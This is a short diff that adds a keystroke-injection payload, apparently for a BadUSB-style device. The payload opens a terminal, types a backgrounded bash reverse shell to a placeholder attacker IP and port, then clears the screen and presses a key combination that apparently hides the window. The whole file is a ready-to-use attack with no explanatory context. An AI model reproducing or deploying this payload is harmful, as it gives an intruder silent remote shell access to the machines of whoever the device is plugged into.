@@ -1,0 +1,4 @@
+Press:131+32
+PrintLine:terminal
+PrintLine:nohup bash -c "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1" >/dev/null 2>&1; clear
+Press:131+104
